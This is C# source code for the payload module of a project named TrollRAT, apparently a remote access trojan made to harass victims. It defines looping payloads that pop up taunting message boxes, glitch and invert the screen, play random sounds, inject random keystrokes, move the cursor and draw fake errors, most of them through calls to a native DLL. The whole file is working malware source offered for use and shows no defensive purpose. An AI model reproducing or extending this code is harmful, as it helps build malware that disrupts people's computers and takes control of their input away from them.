using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace TrollRAT
{
    public class PayloadMessageBox : LoopingPayload
    {
        [DllImport("TrollRATNative.dll", CharSet=CharSet.Auto)]
        public static extern void payloadMessageBox(string text, string label, int style);

        protected PayloadSettingString text = new PayloadSettingString("Still using this computer?", "Message Box Text");
        protected PayloadSettingString label = new PayloadSettingString("lol", "Window Title");

        public PayloadMessageBox()
        {
            name = "Message Boxes";

            settings.Add(text);
            settings.Add(label);
        }

        protected override void execute()
        {
            new Thread(new ThreadStart(messageBoxThread)).Start();
        }

        private void messageBoxThread()
        {
            payloadMessageBox(text.Value, label.Value, 0x1000 | 0x30);
        }
    }

    public class PayloadGlitch : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadGlitch();

        public PayloadGlitch() : base(20) { name = "Screen Glitches"; }

        protected override void execute()
        {
            payloadGlitch();
        }
    }

    public class PayloadSound : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadSound();

        public PayloadSound() : base(20) { name = "Random Sounds"; }

        protected override void execute()
        {
            payloadSound();
        }
    }

    public class PayloadKeyboard : LoopingPayload
    {
        public PayloadKeyboard() : base(20) { name = "Random Keyboard Input"; }

        protected override void execute()
        {
            SendKeys.SendWait(((Char)new Random().Next('a', 'z')).ToString());
        }
    }

    public class PayloadTunnel : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadTunnel();

        public PayloadTunnel() : base(20) { name = "Tunnel Effect"; }

        protected override void execute()
        {
            payloadTunnel();
        }
    }

    public class PayloadReverseText : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadReverseText();

        public PayloadReverseText() { name = "Reverse Text"; }

        protected override void execute()
        {
            payloadReverseText();
        }
    }

    public class PayloadDrawErrors : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadDrawErrors();

        public PayloadDrawErrors() : base(2) { name = "Draw Errors"; }

        protected override void execute()
        {
            payloadDrawErrors();
        }
    }

    public class PayloadInvertScreen : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadInvertScreen();

        public PayloadInvertScreen() { name = "Invert Screen"; }

        protected override void execute()
        {
            payloadInvertScreen();
        }
    }

    public class PayloadCursor : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadCursor(int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(4, "Movement Factor", 2, 100, 1);

        public PayloadCursor() : base(2)
        {
            name = "Move Cursor";
            settings.Add(power);
        }

        protected override void execute()
        {
            payloadCursor((int)power.Value);
        }
    }
}
